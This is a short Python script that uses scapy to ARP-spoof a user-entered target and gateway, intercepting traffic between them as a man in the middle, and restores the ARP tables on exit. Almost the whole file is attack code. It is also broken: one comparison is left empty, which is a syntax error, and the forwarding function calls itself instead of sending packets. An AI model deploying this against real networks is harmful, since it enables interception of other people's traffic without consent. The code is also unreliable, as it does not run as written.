import scapy.all as scapy
import time

interval = 4
ip_target = input("Enter target IP address: ")
ip_gateway = input("Enter gateway IP address: ")
filter = "host "+ip_target+" and "+ip_gateway

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
   
def restore(destination_ip, source_ip):
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
  
def send(x):
    x.summary()
    if x[scapy.IP] == :
        x[scapy.IP].dst = ip_target
    else:
        x[scapy.IP].dst = ip_gateway
    send(x)



try:
    try:
        while True:
            spoof(ip_target, ip_gateway)
            spoof(ip_gateway, ip_target)
            time.sleep(interval)
    except KeyboardInterrupt:
        while True:
            scapy.sniff(filter=filter, prn=send)
except KeyboardInterrupt:
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)
